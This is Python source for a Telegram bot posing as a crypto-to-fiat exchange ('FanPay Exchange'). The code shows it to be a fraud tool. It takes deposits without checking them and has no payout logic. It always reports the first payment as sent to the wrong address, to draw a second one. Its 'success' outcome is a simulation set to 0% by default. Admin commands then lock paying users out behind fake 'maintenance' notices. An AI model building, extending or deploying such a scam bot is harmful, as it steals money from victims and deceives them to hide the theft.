import asyncio
import json
import logging
import os
import random
from datetime import datetime, timedelta

import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

from config import (
    ADMIN_IDS, BOT_TOKEN, COINGECKO_IDS, COMMISSION_PERCENT,
    CRYPTO_CURRENCIES, FIAT_CURRENCIES, MAX_AMOUNT_USD,
    MIN_AMOUNT_USD, WALLETS,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(name)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

MAINTENANCE_FILE = "maintenance.json"
MESSAGES_FILE = "messages.json"

# ─── MESSAGES ───

DEFAULT_MESSAGES = {
    "start": "<b>FanPay Exchange</b>\n\nСервис обмена криптовалют на фиатные деньги.\n\n<b>Криптовалюты:</b> USDT, BTC, TON\n<b>Валюты:</b> RUB, UAH, KZT\n\nНажмите <b>Начать обмен</b> для старта.",
    "help_user": "<b>Доступные команды:</b>\n\n<code>/start</code> — Главное меню\n<code>/help</code> — Справка",
    "help_admin": "\n\n<b>Админ-команды:</b>\n<code>/maintenance &lt;id&gt; [часы]</code> — Заблокировать юзера\n<code>/unmaintenance &lt;id&gt;</code> — Разблокировать\n<code>/maint_list</code> — Список заблокированных\n<code>/set_rate &lt;0-100&gt;</code> — Процент успеха симуляции\n<code>/auto_maint on/off</code> — Авто-блокировка после обмена\n<code>/auto_maint_hours &lt;n&gt;</code> — Задержка авто-блокировки\n<code>/block_completed [часы]</code> — Список/блокировка завершивших\n<code>/set_support &lt;контакт&gt;</code> — Контакт поддержки",
    "crypto_prompt": "<b>Выберите криптовалюту для отправки:</b>",
    "crypto_error": "Ошибка",
    "fiat_prompt": "<b>В какой валюте получить?</b>",
    "fiat_error": "Ошибка",
    "amount_prompt": "<b>Введите сумму в USD</b>\n\nМин: ${min}  Макс: ${max}\n\n<i>Пример: 50, 100, 250.50</i>",
    "amount_range_error": "Сумма должна быть от ${min} до ${max}.",
    "amount_format_error": "Введите корректное число (100, 50.50)",
    "fetching_rates": "Получаю курсы...",
    "crypto_rate_error": "Ошибка получения курса криптовалюты. Попробуйте позже.",
    "fiat_rate_error": "Ошибка получения курса фиатной валюты. Попробуйте позже.",
    "exchange_details": "<b>Детали обмена</b>\n\nОтправляете:  <code>{crypto_amount}</code> {crypto}\nПолучаете:    <code>{fiat_amount}</code> {fiat}\n\n{crypto}/USD:  <code>${crypto_price}</code>\nUSD/{fiat}:    <code>{fiat_rate}</code>\nКомиссия:     <code>{fee}%</code>\n\n<b>Кошелёк ({crypto}):</b>\n<code>{wallet}</code>\n\nОтправьте ровно <b>{crypto_amount} {crypto}</b> на указанный адрес.\nПосле отправки нажмите <b>Я оплатил</b>.",
    "processing": "<b>Обработка транзакции</b>\n\nОжидается подтверждение сети (2–15 минут).\nВы получите уведомление, когда транзакция будет найдена.",
    "attempt1_failed": "<b>Средства не поступили</b>\n\nПохоже, вы отправили не на тот адрес.\nПроверьте реквизиты и попробуйте снова.",
    "button_start": "Начать обмен",
    "button_cancel": "Отмена",
    "button_pay": "Я оплатил",
    "success_found": "<b>Транзакция найдена</b>\n\nПолучено:  <code>{crypto_amount}</code> {crypto}\nК выплате: <code>{fiat_amount}</code> {fiat}\n\n<b>Статус: Выплата от 2 до 24 часов</b>\n\nСредства поступят на карту в течение 24 часов.\nПоддержка: {support}",
    "success_not_found": "<b>Транзакция не найдена</b>\n\nНе обнаружено поступление средств на кошелёк.\n\nВозможные причины:\n- Недостаточно подтверждений сети\n- Отправлена неверная сумма\n- Перевод ещё в пути\n\nПроверьте статус позже или обратитесь в поддержку.",
    "auto_maint_scheduled": "<b>Технические работы запланированы</b>\n\nДоступ к боту будет ограничен с {start}.",
    "cancel_done": "Отменено.",
    "cancel_menu": "Главное меню:",
    "access_denied": "Доступ запрещён.",
    "maintenance_immediate": "<b>Блокировка активирована</b>\n\nПользователь: <code>{user_id}</code>\nЗаблокирован навсегда до снятия.",
    "maintenance_scheduled": "<b>Блокировка запланирована</b>\n\nПользователь: <code>{user_id}</code>\nНачало: {start}\n(через {hours} ч., навсегда)",
    "maintenance_usage": "<b>Использование:</b>\n<code>/maintenance &lt;user_id&gt;</code> — заблокировать сразу\n<code>/maintenance &lt;user_id&gt; &lt;часы&gt;</code> — заблокировать через N часов\n\n<i>Примеры:</i>\n<code>/maintenance 123456789</code>\n<code>/maintenance 123456789 24</code>",
    "unmaintenance_usage": "<b>Использование:</b>\n<code>/unmaintenance &lt;user_id&gt;</code>",
    "unmaintenance_not_found": "Пользователь <code>{user_id}</code> не найден.",
    "unmaintenance_done": "Блокировка снята для <code>{user_id}</code>.",
    "maint_list_empty": "Список блокировок пуст.",
    "maint_list_header": "<b>Список блокировок:</b>",
    "maint_list_active": "<code>{user_id}</code> — активна (с {start})",
    "maint_list_scheduled": "<code>{user_id}</code> — запланирована через {hours}ч ({start})",
    "set_rate_usage": "<b>Использование:</b>\n<code>/set_rate 0-100</code>\n\n<i>Пример: /set_rate 50</i>",
    "set_rate_error": "Введите число от 0 до 100.",
    "set_rate_done": "Процент успеха симуляции: <b>{rate}%</b>",
    "auto_maint_usage": "<b>Использование:</b>\n<code>/auto_maint on</code> — включить\n<code>/auto_maint off</code> — выключить",
    "auto_maint_done": "Авто-блокировка после обмена: {status}",
    "auto_maint_hours_usage": "<b>Использование:</b>\n<code>/auto_maint_hours &lt;часы&gt;</code>\n\n<i>Пример: /auto_maint_hours 48</i>",
    "auto_maint_hours_error": "Введите положительное число.",
    "auto_maint_hours_done": "Задержка авто-блокировки: <b>{hours} ч.</b>",
    "block_completed_usage": "<b>Использование:</b>\n<code>/block_completed</code> — список\n<code>/block_completed &lt;часы&gt;</code> — заблокировать всех",
    "block_completed_empty": "Нет завершивших обмен пользователей.",
    "block_completed_header": "<b>Завершили обмен ({count}):</b>",
    "block_completed_no_users": "Нет пользователей для блокировки.",
    "block_completed_done": "Заблокировано <b>{count}</b> пользователей на <b>{hours} ч.</b>",
    "set_support_usage": "<b>Использование:</b>\n<code>/set_support &lt;контакт&gt;</code>\n\n<i>Пример: /set_support @my_support</i>",
    "set_support_done": "Контакт поддержки обновлён: <b>{contact}</b>",
}

MSG = dict(DEFAULT_MESSAGES)

def load_messages():
    global MSG
    if not os.path.exists(MESSAGES_FILE):
        with open(MESSAGES_FILE, "w", encoding="utf-8") as f:
            json.dump(DEFAULT_MESSAGES, f, indent=2, ensure_ascii=False)
        MSG = dict(DEFAULT_MESSAGES)
        return
    try:
        with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
            custom = json.load(f)
        MSG = dict(DEFAULT_MESSAGES)
        MSG.update(custom)
    except Exception:
        MSG = dict(DEFAULT_MESSAGES)

# ─── FSM ───

class ExchangeState(StatesGroup):
    choose_crypto = State()
    choose_fiat = State()
    enter_amount = State()
    confirm_payment = State()
    processing = State()

# ─── INIT ───

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

load_messages()

# ─── MAINTENANCE ───

def load_maintenance() -> dict:
    if not os.path.exists(MAINTENANCE_FILE):
        return {}
    try:
        with open(MAINTENANCE_FILE) as f:
            raw = json.load(f)
        return {int(uid): datetime.fromisoformat(exp) for uid, exp in raw.items()}
    except Exception:
        return {}

def save_maintenance(data: dict):
    to_save = {str(uid): dt.isoformat() for uid, dt in data.items()}
    with open(MAINTENANCE_FILE, "w") as f:
        json.dump(to_save, f, indent=2)

# ─── SETTINGS ───

SETTINGS_FILE = "settings.json"
COMPLETED_FILE = "completed_users.json"

def load_settings() -> dict:
    defaults = {"success_rate": 0, "auto_maintenance": False, "auto_maintenance_hours": 24, "support_contact": "@support"}
    if not os.path.exists(SETTINGS_FILE):
        save_settings(defaults)
        return defaults.copy()
    try:
        with open(SETTINGS_FILE) as f:
            data = json.load(f)
        result = defaults.copy()
        result.update(data)
        return result
    except Exception:
        return defaults.copy()

def save_settings(data: dict):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def add_user_maintenance(uid: int, hours: float | None = None):
    maint = load_maintenance()
    start = datetime.now() if hours is None else datetime.now() + timedelta(hours=hours)
    maint[uid] = start
    save_maintenance(maint)

def load_completed_users() -> dict:
    if not os.path.exists(COMPLETED_FILE):
        return {}
    try:
        with open(COMPLETED_FILE) as f:
            raw = json.load(f)
        return {int(uid): datetime.fromisoformat(ts) for uid, ts in raw.items()}
    except Exception:
        return {}

def save_completed_users(data: dict):
    to_save = {str(uid): ts.isoformat() for uid, ts in data.items()}
    with open(COMPLETED_FILE, "w") as f:
        json.dump(to_save, f, indent=2)

# ─── KEYBOARDS ───

def main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=MSG.get("button_start", "Начать обмен"))]],
        resize_keyboard=True,
    )

def inline_kb(items: list[tuple[str, str]], *, cancel: bool = True):
    b = InlineKeyboardBuilder()
    for text, cb in items:
        b.button(text=text, callback_data=cb)
    if cancel:
        b.button(text=MSG.get("button_cancel", "Отмена"), callback_data="cancel")
    b.adjust(1)
    return b.as_markup()

# ─── API ───

async def get_crypto_price(crypto: str) -> float | None:
    cid = COINGECKO_IDS.get(crypto)
    if not cid:
        return None
    url = f"https://api.coingecko.com/api/v3/simple/price?ids={cid}&vs_currencies=usd"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=10) as r:
                if r.status == 200:
                    return (await r.json())[cid]["usd"]
    except Exception as e:
        logger.error(f"CoinGecko: {e}")

async def get_fiat_rates() -> dict | None:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://open.er-api.com/v6/latest/USD", timeout=10) as r:
                if r.status == 200:
                    return (await r.json()).get("rates")
    except Exception as e:
        logger.error(f"FX: {e}")

# ─── MIDDLEWARE ───

@dp.message.outer_middleware()
async def maint_msg_mw(handler, event: Message, data):
    uid = event.from_user.id
    maint = load_maintenance()
    if uid in maint and datetime.now() >= maint[uid]:
        await event.answer(
            "<b>Технические работы</b>\n\n"
            "Бот временно недоступен. Попробуйте позже.",
            parse_mode="HTML",
        )
        return
    return await handler(event, data)

@dp.callback_query.outer_middleware()
async def maint_cb_mw(handler, event: CallbackQuery, data):
    uid = event.from_user.id
    maint = load_maintenance()
    if uid in maint and datetime.now() >= maint[uid]:
        await event.answer("Технические работы", show_alert=True)
        return
    return await handler(event, data)

# ─── USER HANDLERS ───

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(MSG["start"], parse_mode="HTML", reply_markup=main_kb())

@dp.message(Command("help"))
async def cmd_help(message: Message):
    text = MSG["help_user"] + (MSG["help_admin"] if is_admin(message.from_user.id) else "")
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == MSG.get("button_start", "Начать обмен"))
async def start_exchange(message: Message, state: FSMContext):
    await state.set_state(ExchangeState.choose_crypto)
    items = [(v, f"crypto:{k}") for k, v in CRYPTO_CURRENCIES.items()]
    await message.answer(MSG["crypto_prompt"], parse_mode="HTML", reply_markup=inline_kb(items))

@dp.callback_query(F.data.startswith("crypto:"))
async def pick_crypto(cb: CallbackQuery, state: FSMContext):
    crypto = cb.data.split(":", 1)[1]
    if crypto not in CRYPTO_CURRENCIES:
        return await cb.answer(MSG.get("crypto_error", "Ошибка"))
    await state.update_data(crypto=crypto)
    await state.set_state(ExchangeState.choose_fiat)
    items = [(v, f"fiat:{k}") for k, v in FIAT_CURRENCIES.items()]
    await cb.message.edit_text(MSG["fiat_prompt"], parse_mode="HTML", reply_markup=inline_kb(items))
    await cb.answer()

@dp.callback_query(F.data.startswith("fiat:"))
async def pick_fiat(cb: CallbackQuery, state: FSMContext):
    fiat = cb.data.split(":", 1)[1]
    if fiat not in FIAT_CURRENCIES:
        return await cb.answer(MSG.get("fiat_error", "Ошибка"))
    await state.update_data(fiat=fiat)
    await state.set_state(ExchangeState.enter_amount)
    await cb.message.edit_text(
        MSG["amount_prompt"].replace("{min}", str(MIN_AMOUNT_USD)).replace("{max}", str(MAX_AMOUNT_USD)),
        parse_mode="HTML",
    )
    await cb.answer()

@dp.message(StateFilter(ExchangeState.enter_amount))
async def handle_amount(message: Message, state: FSMContext):
    try:
        usd = float(message.text.replace(",", ".").strip())
        if not (MIN_AMOUNT_USD <= usd <= MAX_AMOUNT_USD):
            return await message.answer(
                MSG["amount_range_error"].replace("{min}", str(MIN_AMOUNT_USD)).replace("{max}", str(MAX_AMOUNT_USD))
            )
    except (ValueError, OverflowError):
        return await message.answer(MSG.get("amount_format_error", "Введите корректное число (100, 50.50)"))

    await state.update_data(amount_usd=usd)
    data = await state.get_data()
    crypto, fiat = data["crypto"], data["fiat"]

    msg = await message.answer(MSG.get("fetching_rates", "Получаю курсы..."))

    crypto_price = await get_crypto_price(crypto)
    if crypto_price is None:
        await msg.edit_text(MSG.get("crypto_rate_error", "Ошибка получения курса криптовалюты. Попробуйте позже."))
        return await state.clear()

    fiat_rates = await get_fiat_rates()
    if fiat_rates is None or fiat not in fiat_rates:
        await msg.edit_text(MSG.get("fiat_rate_error", "Ошибка получения курса фиатной валюты. Попробуйте позже."))
        return await state.clear()

    fiat_rate = fiat_rates[fiat]
    crypto_amount = usd / crypto_price
    fiat_amount = usd * fiat_rate * (1 - COMMISSION_PERCENT / 100)

    await state.update_data(crypto_price=crypto_price, fiat_rate=fiat_rate,
                            crypto_amount=crypto_amount, fiat_amount=fiat_amount)

    c_str = f"{crypto_amount:.6f}".rstrip("0").rstrip(".")
    f_str = f"{fiat_amount:.2f}"
    wallet = WALLETS.get(crypto, WALLETS["USDT"])
    sym = {"RUB": "RUB", "UAH": "UAH", "KZT": "KZT"}.get(fiat, "")

    await msg.edit_text(
        MSG["exchange_details"].format(
            crypto_amount=c_str, crypto=crypto,
            fiat_amount=f_str, fiat=sym,
            crypto_price=f"{crypto_price:.2f}",
            fiat_rate=f"{fiat_rate:.2f}",
            fee=COMMISSION_PERCENT, wallet=wallet,
        ),
        parse_mode="HTML",
        reply_markup=inline_kb([(MSG.get("button_pay", "Я оплатил"), "paid")]),
    )
    await state.set_state(ExchangeState.confirm_payment)

@dp.callback_query(F.data == "paid")
async def payment_done(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    attempt = data.get("attempt", 0) + 1
    await state.update_data(attempt=attempt)

    crypto = data.get("crypto", "USDT")
    fiat = data.get("fiat", "RUB")
    c_amt = data.get("crypto_amount", 0)
    f_amt = data.get("fiat_amount", 0)
    sym = {"RUB": "RUB", "UAH": "UAH", "KZT": "KZT"}.get(fiat, "")
    c_str = f"{c_amt:.6f}".rstrip("0").rstrip(".")
    f_str = f"{f_amt:.2f}"

    await state.set_state(ExchangeState.processing)
    await cb.message.edit_text(MSG["processing"], parse_mode="HTML")
    await cb.answer()

    await asyncio.sleep(random.randint(60, 120))

    if attempt == 1:
        await state.set_state(ExchangeState.confirm_payment)
        await cb.message.answer(MSG["attempt1_failed"], parse_mode="HTML",
                                reply_markup=inline_kb([(MSG.get("button_pay", "Я оплатил"), "paid")]))
        return

    settings = load_settings()
    success = random.random() < settings["success_rate"] / 100

    if not success:
        await cb.message.answer(MSG["success_not_found"], parse_mode="HTML", reply_markup=main_kb())

    completed = load_completed_users()
    completed[cb.from_user.id] = datetime.now()
    save_completed_users(completed)

    if settings["auto_maintenance"]:
        hours = settings["auto_maintenance_hours"]
        add_user_maintenance(cb.from_user.id, hours)
        start = datetime.now() + timedelta(hours=hours)
        await cb.message.answer(
            MSG["auto_maint_scheduled"].format(start=start.strftime("%d.%m.%Y %H:%M")),
            parse_mode="HTML",
        )

    await state.clear()

@dp.callback_query(F.data == "cancel")
async def cancel_all(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await cb.message.edit_text(MSG.get("cancel_done", "Отменено."))
    await cb.message.answer(MSG.get("cancel_menu", "Главное меню:"), reply_markup=main_kb())
    await cb.answer()

# ─── ADMIN HANDLERS ───

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

@dp.message(Command("maintenance"))
async def cmd_maintenance(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split()
    if len(args) == 2:
        try:
            uid = int(args[1])
        except ValueError:
            return await message.answer("Неверный ID пользователя.")
        add_user_maintenance(uid)
        await message.answer(
            MSG["maintenance_immediate"].format(user_id=uid), parse_mode="HTML")
    elif len(args) == 3:
        try:
            uid = int(args[1])
            hours = float(args[2])
            if hours <= 0:
                raise ValueError
        except ValueError:
            return await message.answer("Неверные аргументы.")
        start = datetime.now() + timedelta(hours=hours)
        add_user_maintenance(uid, hours)
        await message.answer(
            MSG["maintenance_scheduled"].format(user_id=uid, hours=f"{hours:.1f}",
                                                 start=start.strftime("%d.%m.%Y %H:%M")),
            parse_mode="HTML")
    else:
        await message.answer(MSG["maintenance_usage"], parse_mode="HTML")

@dp.message(Command("unmaintenance"))
async def cmd_unmaintenance(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split()
    if len(args) != 2:
        return await message.answer(MSG["unmaintenance_usage"], parse_mode="HTML")
    try:
        uid = int(args[1])
    except ValueError:
        return await message.answer("Неверный ID.")
    maint = load_maintenance()
    if uid not in maint:
        return await message.answer(MSG["unmaintenance_not_found"].format(user_id=uid), parse_mode="HTML")
    del maint[uid]
    save_maintenance(maint)
    await message.answer(MSG["unmaintenance_done"].format(user_id=uid), parse_mode="HTML")

@dp.message(Command("maint_list"))
async def cmd_maint_list(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    maint = load_maintenance()
    if not maint:
        return await message.answer(MSG.get("maint_list_empty", "Список блокировок пуст."))
    now = datetime.now()
    lines = [MSG.get("maint_list_header", "<b>Список блокировок:</b>")]
    for uid, start in sorted(maint.items(), key=lambda x: x[1]):
        if now >= start:
            lines.append(MSG["maint_list_active"].format(user_id=uid, start=start.strftime("%d.%m.%Y %H:%M")))
        else:
            rem = int((start - now).total_seconds() // 3600)
            lines.append(MSG["maint_list_scheduled"].format(user_id=uid, hours=rem, start=start.strftime("%d.%m.%Y %H:%M")))
    await message.answer("\n".join(lines), parse_mode="HTML")

# ─── SETTINGS COMMANDS ───

@dp.message(Command("set_rate"))
async def cmd_set_rate(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split()
    if len(args) != 2:
        return await message.answer(MSG["set_rate_usage"], parse_mode="HTML")
    try:
        rate = int(args[1])
        if rate < 0 or rate > 100:
            raise ValueError
    except ValueError:
        return await message.answer(MSG["set_rate_error"], parse_mode="HTML")
    s = load_settings()
    s["success_rate"] = rate
    save_settings(s)
    await message.answer(MSG["set_rate_done"].format(rate=rate), parse_mode="HTML")

@dp.message(Command("auto_maint"))
async def cmd_auto_maint(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split()
    if len(args) != 2 or args[1].lower() not in ("on", "off"):
        return await message.answer(MSG["auto_maint_usage"], parse_mode="HTML")
    s = load_settings()
    s["auto_maintenance"] = args[1].lower() == "on"
    save_settings(s)
    status = "включена" if s["auto_maintenance"] else "выключена"
    await message.answer(MSG["auto_maint_done"].format(status=status), parse_mode="HTML")

@dp.message(Command("auto_maint_hours"))
async def cmd_auto_maint_hours(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split()
    if len(args) != 2:
        return await message.answer(MSG["auto_maint_hours_usage"], parse_mode="HTML")
    try:
        hours = float(args[1])
        if hours <= 0:
            raise ValueError
    except ValueError:
        return await message.answer(MSG.get("auto_maint_hours_error", "Введите положительное число."))
    s = load_settings()
    s["auto_maintenance_hours"] = hours
    save_settings(s)
    await message.answer(MSG["auto_maint_hours_done"].format(hours=hours), parse_mode="HTML")

@dp.message(Command("block_completed"))
async def cmd_block_completed(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split()
    if len(args) not in (1, 2):
        return await message.answer(MSG["block_completed_usage"], parse_mode="HTML")
    completed = load_completed_users()
    if len(args) == 1:
        if not completed:
            return await message.answer(MSG.get("block_completed_empty", "Нет завершивших обмен пользователей."))
        lines = [MSG["block_completed_header"].format(count=len(completed))]
        for uid, ts in sorted(completed.items(), key=lambda x: x[1]):
            lines.append(f"<code>{uid}</code> — {ts.strftime('%d.%m.%Y %H:%M')}")
        return await message.answer("\n".join(lines), parse_mode="HTML")
    try:
        hours = float(args[1])
        if hours <= 0:
            raise ValueError
    except ValueError:
        return await message.answer("Введите положительное число часов.")
    if not completed:
        return await message.answer(MSG.get("block_completed_no_users", "Нет пользователей для блокировки."))
    count = 0
    for uid in completed:
        add_user_maintenance(uid, hours)
        count += 1
    await message.answer(MSG["block_completed_done"].format(count=count, hours=hours), parse_mode="HTML")

@dp.message(Command("set_support"))
async def cmd_set_support(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer(MSG.get("access_denied", "Доступ запрещён."))
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        return await message.answer(MSG["set_support_usage"], parse_mode="HTML")
    s = load_settings()
    s["support_contact"] = args[1]
    save_settings(s)
    await message.answer(MSG["set_support_done"].format(contact=args[1]), parse_mode="HTML")

# ─── MAIN ───

async def main():
    logger.info("FanPay Exchange bot started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped")
